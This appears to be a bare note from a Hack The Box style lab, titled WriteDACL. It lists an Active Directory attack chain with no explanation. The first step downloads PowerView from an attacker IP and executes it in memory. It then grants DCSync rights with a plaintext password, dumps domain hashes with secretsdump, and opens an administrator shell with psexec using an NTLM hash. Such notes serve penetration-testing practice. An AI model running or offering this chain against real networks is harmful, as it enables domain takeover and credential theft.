WriteDACL


```windows
iex(new-object net.webclient).DownloadString('http://10.10.16.2/powerview.ps1')

$pass = ConvertTo-SecureString 'Password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\john', $pass)

Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

```

```linux
secretsdump.py htb/john@10.10.10.161

psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```